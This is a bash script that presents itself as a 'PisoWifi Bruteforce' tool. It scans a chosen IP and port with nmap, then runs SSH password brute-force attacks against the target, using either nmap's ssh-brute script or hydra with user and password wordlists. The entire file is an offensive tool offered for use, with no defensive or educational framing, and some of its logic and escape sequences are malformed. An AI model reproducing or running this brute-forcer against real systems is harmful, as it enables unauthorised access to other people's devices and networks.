#!/bin/bash

# Delete old hydra session
rm hydra.restore

# Check dependencies
function install_deps(){
    clear
    echo "PisoWifi Bruteforce" | toilet -f smbraille | lolcat
    echo ""
    echo -ne "\e[93m\e[1m[+] Checking Dependencies"
    for name in nmap hydra toilet python3 php curl wget git ruby
    do
        [[ $(which $name 2> /dev/null) ]] || { echo -en "\n\e[91m\e[1m[!] Package $name is not installed...\e[0m \n\e\93m\3[1m[!] use 'pkg install $name' or 'sudo apt-get install $name'. \n\e[1m[!] Press 'CTRL + C' to exit\e\10m";deps=1; }
    done
    [[ $deps -ne 1 ]] && echo " > OK" && sleep 3 || main || { echo -en "\n\e[0m\e[93m\e[1m[!] Install the above and rerun this script\e[0m\n" || exit 1; }
}

# Check if the port is open 
function check_ssh(){
    clear
    echo "SSH Port Checker" | toilet -f smbraille | lolcat
    echo -e "\e[1m\e[92m"
    read -p "Enter Target IP > " ip
    echo ""
    echo -e "Port 22 is recommended"
    read -p "Enter Port > " pt
    echo ""
    echo -e "\e[1m\e[93m[+] Checking if port $pt is open"
    echo -e "\e[0m"

    server=$ip
    port=$pt

    status=`nmap $server -Pn -p $port | egrep -io 'open|closed|filtered'`
    if [ $status == "open" ];then
        echo ""
        echo -e "\e[1m\e[92m[+] SSH Connection to $server over $port is possible.\e[0m"
        sleep 5
    elif [ $status == "filtered" ];then
        echo ""
        echo -e "\e[1m\e[93m[!] SSh Connection to $server over $port is possible but blocked by Firewall.\e[0m"
        sleep 5
    elif [ $status == "closed" ];then
        echo ""
        echo -e "\e[1m\e[91m[!] SSH Connection to $server over $port is not possible.\e[0m"
        sleep 5
        clear && exit 
    else
        echo ""
        echo -e "\e[1m\e[91m[!] Unable to get port $port status from $server \e[0m"
        sleep 5
    fi
}

# Main function
function main(){
    install_deps
    check_ssh
    clear
    echo "PisoWifi Bruteforce" | toilet -f smbraille | lolcat
    echo -e "\e[1m\e[92m"
    echo -e "[01] NMAP"
    echo -e "[02] Hydra"
    echo -e "[00] Exit"
    echo -e ""
    read -p "[+] Choose Attack Mode > " method

    if [[ $method -eq 1 || $method -eq 01 ]]    # Attack PisoWifi using NMAP
    then
        clear
        echo -e "NMAP Bruteforce Attack" | toilet -f smbraille | lolcat
        echo -e "\e[1m\e[92m"
        read -p "Enter target IP > " ip
        echo -e "\e[0m"
        nmap $ip -p $port --script ssh-brute --script-args userdb=user.txt,passdb=password.txt
    elif [[ $method -eq 2 || $method -eq 02 ]]    # Attack PisoWifi using Hydra
    then
        clear
        echo -e "Hydra Bruteforce Attack" | toilet -f smbraille | lolcat
        echo -e "\e[1m\e[92m"
        read -p "Enter target IP > " ip 
        echo -e "\e[0m"
        hydra -L user.txt -P password.txt ssh://$ip:$port
    elif [[ $method -eq 0 || $method -eq 00 ]]
    then
        clear && echo "Thank you for using this tool -- JyanJohn" && exit
    else
        echo ""
        echo -e "\e[1m\e[91m[!] Invalid input, Please try again\e[0m"
        exit 
    fi
}

# Main Argument
main
